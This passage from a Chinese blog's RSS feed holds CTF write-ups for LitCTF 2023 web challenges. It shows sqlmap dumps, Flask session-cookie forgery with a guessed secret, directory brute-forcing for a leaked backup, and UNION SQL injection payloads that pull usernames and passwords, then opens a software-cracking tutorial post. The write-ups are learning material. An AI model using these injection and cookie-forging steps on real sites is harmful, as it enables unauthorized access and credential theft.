+&lt;p&gt;&lt;img src=&quot;https://www.chuzoux.top/_astro/LitCTF-2023-44.FS9Kztej.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;查询数据&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;python sqlmap.py -u http://node5.anna.nssctf.cn:23615/?id=1 -D ctftraining -T flag -C flag --dump
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;（触发时间盲注 速度较慢）&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://www.chuzoux.top/_astro/LitCTF-2023-45.BAC4raan.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h3&gt;FLAG&lt;/h3&gt;
+&lt;p&gt;NSSCTF{24cbda17-c360-4112-9ba3-93cb9798dfea}&lt;/p&gt;
+&lt;h3&gt;CTF所用工具总结&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;浏览器&lt;/li&gt;
+&lt;li&gt;hack bar&lt;/li&gt;
+&lt;li&gt;sqlmap&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3&gt;难度&lt;/h3&gt;
+&lt;p&gt;※※※※（四颗星，一般）&lt;/p&gt;
+&lt;h2&gt;【LitCTF 2023】Flag点击就送！&lt;/h2&gt;
+&lt;h3&gt;题目知识标签&lt;/h3&gt;
+&lt;p&gt;Cookie伪造、Flask、Ejs&lt;/p&gt;
+&lt;h3&gt;WP&lt;/h3&gt;
+&lt;p&gt;打开随便输入个名字
+点击拿flag提示只有管理员才能拿flag&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://www.chuzoux.top/_astro/LitCTF-2023-46.BMqlwnQe.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;返回初始页面
+输入admin 提示你并非管理员&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://www.chuzoux.top/_astro/LitCTF-2023-47.CK4FvuFP.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;我们可以由此判断出管理员名称为admin
+我们输入任意值后 在拿flag分析数据包
+找到了cookie值中 存在session值
+&lt;code&gt;eyJuYW1lIjoiMSJ9.aRiRSQ.qRcMu-i6fQDODuj7-p9g4N4ZOM8&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;分析session值 进行base64解密&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://www.chuzoux.top/_astro/LitCTF-2023-48.ChQTWQvm.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;发现session是被加密过的base64数据 于是分析框架以做到session数据的处理
+我们可以猜测这个题应该是构造admin的session拿flag
+通过&lt;strong&gt;Wappalyzer&lt;/strong&gt;插件分析网站框架为&lt;strong&gt;Flask&lt;/strong&gt;
+&lt;img src=&quot;https://www.chuzoux.top/_astro/LitCTF-2023-49.Cm70wPBM.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;根据flask框架特点 我们可以发现他会创建一个密钥进行加密
+我们要爆破出密钥 这里使用&lt;strong&gt;flask-unsign&lt;/strong&gt;工具进行爆破&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;flask-unsign --unsign --cookie &quot;cookie&quot; -w &quot;wordlist file&quot; --no-literal-eval 
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;发现我们使用常见的字典后无法破解&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://www.chuzoux.top/_astro/LitCTF-2023-50.DBkWpxZ8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;而题目也不会这么难
+于是我们根据题目相关信息进行密钥猜测&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://www.chuzoux.top/_astro/LitCTF-2023-51.D_mzvAxY.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;发现密钥就是&lt;strong&gt;LitCTF&lt;/strong&gt;
+根据此密钥 我们使用 &lt;strong&gt;flask-session-cookie-manager&lt;/strong&gt; 工具构造session&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;python flask_session_cookie_manager3.py encode -s &quot;LitCTF&quot; -t &quot;{&apos;name&apos;:&apos;admin&apos;}&quot;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img src=&quot;https://www.chuzoux.top/_astro/LitCTF-2023-52.CgT6jFS_.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;得到构造后的session为&lt;code&gt;eyJuYW1lIjoiYWRtaW4ifQ.aRiYLQ.1chaPrijlkgD2V9KFs1-yD-5lCY&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;我们使用 &lt;strong&gt;burp suite&lt;/strong&gt; 将所得的session值封装到数据包中&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://www.chuzoux.top/_astro/LitCTF-2023-53.D7y2lm2F.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;发送数据包拿到flag&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://www.chuzoux.top/_astro/LitCTF-2023-54.C91EwoUS.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h3&gt;FLAG&lt;/h3&gt;
+&lt;p&gt;NSSCTF{ee937afc-f3de-42c3-a86a-dfa71382429f}&lt;/p&gt;
+&lt;h3&gt;CTF所用工具总结&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;浏览器&lt;/li&gt;
+&lt;li&gt;flask-unsign&lt;/li&gt;
+&lt;li&gt;Wappalyzer&lt;/li&gt;
+&lt;li&gt;burp suite&lt;/li&gt;
+&lt;li&gt;flask-session-cookie-manager&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3&gt;难度&lt;/h3&gt;
+&lt;p&gt;※※※※※※（六颗星，难）&lt;/p&gt;
+&lt;h2&gt;【LitCTF 2023】彩蛋&lt;/h2&gt;
+&lt;h3&gt;题目知识标签&lt;/h3&gt;
+&lt;p&gt;其他&lt;/p&gt;
+&lt;h3&gt;WP&lt;/h3&gt;
+&lt;p&gt;题目提示：彩蛋分布于 我Flag呢 Follow me and hack me 作业管理系统 狠狠的注入 四个题目 中&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;part1&lt;/strong&gt;（我Flag呢）&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://www.chuzoux.top/_astro/LitCTF-2023-55.Dn2380q9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;在控制台页面发现彩蛋提示
+输入对应提示指令&lt;code&gt;giveMeEgg()&lt;/code&gt;得到第一部分&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://www.chuzoux.top/_astro/LitCTF-2023-56.gt0p48SQ.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;LitCTF{First_t0_The_k3y!（1/?）&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;part2&lt;/strong&gt;（Follow me and hack me）&lt;/p&gt;
+&lt;p&gt;在我们完成这道题的时候 有一行绿的提示&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://www.chuzoux.top/_astro/LitCTF-2023-57.BKNduEi4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;于是我们测试备份文件名称 使用 &lt;strong&gt;dirsearch&lt;/strong&gt; 查询目录&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;python dirsearch.py -u http://node5.anna.nssctf.cn:28775/
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img src=&quot;https://www.chuzoux.top/_astro/LitCTF-2023-58.DVUur4i8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;下载目录中的 &lt;code&gt;www.zip&lt;/code&gt; 文件&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://www.chuzoux.top/_astro/LitCTF-2023-59.DycapAz8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;分析文件
+我们可以在&lt;code&gt;index.php.bak&lt;/code&gt;文件中找到这一部分flag&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://www.chuzoux.top/_astro/LitCTF-2023-60.CmhK6EEW.png&quot; alt=&quot;&quot; /&gt;
+_R3ady_Pl4yer_000ne_ (3/?)&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;part3&lt;/strong&gt;（作业管理系统）&lt;/p&gt;
+&lt;p&gt;依旧登录系统
+在文件上传页面发现远程下载示例&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://www.chuzoux.top/_astro/LitCTF-2023-61.Bo0GW37-.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;打开示例链接 获得此部分flag&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://www.chuzoux.top/_astro/LitCTF-2023-62.J0jQ0wbC.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;_S0_ne3t? (2/?)&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;part4&lt;/strong&gt;（狠狠的注入）&lt;/p&gt;
+&lt;p&gt;在我们做这个题的时候 还有一个名为ctf的数据库
+对这个数据库进行查表&lt;/p&gt;
+&lt;p&gt;查表payload&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;?id=1)))))) union select 1,group_concat(table_name) from information_schema.tables where table_schema=&quot;ctf&quot; %23
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img src=&quot;https://www.chuzoux.top/_astro/LitCTF-2023-63.B6tgOSgY.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;查列payload&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;?id=1)))))) union select 1,group_concat(column_name) from information_schema.columns where table_name=&apos;users&apos; and table_schema=&apos;ctf&apos; %23
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img src=&quot;https://www.chuzoux.top/_astro/LitCTF-2023-64.CnfCECnu.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;查数据payload&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;?id=1)))))) union select username,password from ctf.users %23
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img src=&quot;https://www.chuzoux.top/_astro/LitCTF-2023-65.CinUMCXZ.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;得到此部分flag （当然可以用&lt;strong&gt;sqlmap&lt;/strong&gt;）&lt;/p&gt;
+&lt;p&gt;F1rst_to_Th3_eggggggggg!} (4/4)&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;合并四个部分flag&lt;/strong&gt;得到最后flag&lt;/p&gt;
+&lt;p&gt;NSSCTF{First_t0_The_k3y!_S0_ne3t?_R3ady_Pl4yer_000ne_F1rst_to_Th3_eggggggggg!}&lt;/p&gt;
+&lt;h3&gt;FLAG&lt;/h3&gt;
+&lt;p&gt;NSSCTF{First_t0_The_k3y!_S0_ne3t?_R3ady_Pl4yer_000ne_F1rst_to_Th3_eggggggggg!}&lt;/p&gt;
+&lt;h3&gt;CTF所用工具总结&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;浏览器&lt;/li&gt;
+&lt;li&gt;dirsearch&lt;/li&gt;
+&lt;li&gt;sqlmap&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3&gt;难度&lt;/h3&gt;
+&lt;p&gt;※※※※（四颗星，一般）&lt;/p&gt;
+&lt;hr /&gt;
+&lt;h2&gt;总结&lt;/h2&gt;
+&lt;p&gt;这套题总体难度比较简单，而且还挺有趣的，适合Web新手入门，去多方位了解Web题的不同解题角度，题目的writeup可以当作思考路线，题目质量不错，值得一做~~&lt;/p&gt;
 </content:encoded></item><item><title>IDM 逆向开裂教程</title><link>https://www.chuzoux.top/posts/idm/</link><guid isPermaLink="true">https://www.chuzoux.top/posts/idm/</guid><description>IDM 逆向开裂</description><pubDate>Mon, 22 Sep 2025 00:00:00 GMT</pubDate><content:encoded>&lt;h1&gt;IDM（Internet Download Manager）&lt;/h1&gt;
 &lt;h2&gt;免责声明&lt;/h2&gt;
 &lt;p&gt;&amp;lt;font color=red&amp;gt;本站所有的软件均来自网络，逆向教程仅用于学习和交流，请在软件下载24小时内删除&amp;lt;/font&amp;gt;&lt;/p&gt;
